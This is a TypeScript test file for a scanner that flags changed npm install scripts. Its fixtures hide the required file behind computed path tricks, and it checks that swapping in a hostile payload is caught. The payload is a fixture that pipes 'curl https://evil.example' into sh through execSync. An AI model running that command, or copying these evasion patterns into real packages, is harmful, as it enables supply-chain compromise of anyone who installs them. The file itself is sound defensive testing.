import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const sub = (body: string): Record<string, string> => ({
  "package.json": pj({ postinstall: "node scripts/install.js" }),
  "scripts/install.js": body,
  "scripts/lib/ok.js": "1\n",
  "tools/run.js": "1\n",
  "README.md": "a\n",
});

const cases: [string, Record<string, string>][] = [
  ["F1 prefix then computed ../ tail", sub("const up='.'+'.';require('./lib/'+up+'/../tools/run.js')\n")],
  ["F2 template prefix, traversal tail", sub("const t=['..','..','tools','run.js'].join('/');require(`./lib/${t}`)\n")],
  ["F3 cwd-relative resolve with bare prefix", sub("const n='run';require(require('path').resolve('tools/'+n+'.js'))\n")],
  ["F4 process.cwd() prefix", sub("const n='run';require(process.cwd()+'/tools/'+n+'.js')\n")],
  ["F5 INIT_CWD prefix", sub("const n='run';require(process.env.INIT_CWD+'/node_modules/x/tools/'+n)\n")],
  ["F6 npm_package_json dirname", sub("const p=require('path');const n='run';require(p.join(p.dirname(process.env.npm_package_json),'tools',n+'.js'))\n")],
];

for (const [name, base] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, "tools/run.js", evil);
    expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
  });
}
